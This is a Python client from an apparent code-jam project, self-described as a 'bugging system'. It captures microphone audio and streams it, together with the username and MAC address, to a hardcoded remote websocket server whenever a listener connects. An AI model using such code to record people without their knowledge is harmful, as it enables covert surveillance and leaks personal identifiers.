# ---------------------------------------------------------------------#
# File: /client.py
# Project: https://github.com/Lime-Parallelogram/cj2022-stately-satyrs
# Created Date: Saturday, July 23rd 2022, 9:57:26 pm
# Description: System that sends microphone audio over websockets
# Author: Will Hall
# Copyright (c) 2022 Lime Parallelogram
# -----
# Last Modified: Mon Jul 25 2022
# Modified By: Will Hall
# -----
# HISTORY:
# Date      	By	Comments
# ----------	---	---------------------------------------------------------
# 2022-07-25	WH	Records audio from microphone and sends it via a queue over websocket
# ---------------------------------------------------------------------#
# Import modules
import asyncio
import json
import queue
import sys

import sounddevice as sd
import websockets

import user_info_util as util

# Program settings
BUFFER_SIZE = 80  # Max length of outgoing_queue
BLOCK_SIZE = 4096  # Number of bytes per websocket message
SAMPLE_RATE = 12000
CHANNELS = 1  # Audio recording channels
DEVICE = "default"
TIMEOUT = (1/SAMPLE_RATE)*BLOCK_SIZE

USER_INFO = util.get_info()

outgoing_queue = queue.Queue(maxsize=BUFFER_SIZE)


async def record_buffer(websocket):
    """Capture microphone audio into buffer queue"""

    def callback(indata, frame_count, time_info, status):
        # Add captured sample to outgoing queue
        outgoing_queue.put(bytes(indata), timeout=TIMEOUT)
        print("Sample added", outgoing_queue.qsize())

    # Start capturing input data using sounddevice library
    stream = sd.RawInputStream(samplerate=SAMPLE_RATE, blocksize=BLOCK_SIZE, callback=callback, dtype="float32",
                               device=get_default(), channels=CHANNELS)
    with stream:
        timeout_multiplier = 1  # Timeout multiplier used to adjust rate at which que is dispatched

        await asyncio.sleep(TIMEOUT*17)  # Wait for the queue size to build up to at least 5

        listening = True
        while outgoing_queue.qsize() > 0 and listening:
            print("Sent data. Queue size is now:", outgoing_queue.qsize())

            # Update timeout multiplier to attempt to keep record queue constant length
            if outgoing_queue.qsize() > 20:
                timeout_multiplier -= 0.005
            elif outgoing_queue.qsize() < 15:
                timeout_multiplier += 0.005

            await asyncio.sleep(TIMEOUT*timeout_multiplier)  # Delay to keep queue outgoing consistent with incoming
            data = outgoing_queue.get()
            await websocket.send(data)
            if await websocket.recv() == "NO LISTENER":  # OK is sent by server
                listening = False

        print("Stopping listener service")
        stream.stop()
        outgoing_queue.queue.clear()  # Empty queue


def get_default():
    """Get the name of the default microphone"""
    all_devices = sd.query_devices()
    default_mic = sd.default.device[0]
    device_name = all_devices[default_mic]["name"]
    return device_name


async def send_user_info(websocket):
    """Sends the user data collected from the client to the server in the form of a json string"""
    user_info = json.dumps(util.get_info())
    await websocket.send(user_info)


async def main():
    """Main event loop runs client"""
    my_client_name = (USER_INFO["username"] + "-" + USER_INFO["mac_address"]).replace(":", "")
    async with websockets.connect(f"ws://sjlcc.limeparallelogram.uk/stream/{my_client_name}") as websocket:
        while True:
            await send_user_info(websocket)
            response = await websocket.recv()
            print("Server sent response:", response)
            if response != "NO LISTENER":
                print("Will now start sending audio")
                await record_buffer(websocket)
            await asyncio.sleep(30)


def start():
    """Begin the bugging system"""
    asyncio.run(main())


if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        sys.exit('\nInterrupted by user')
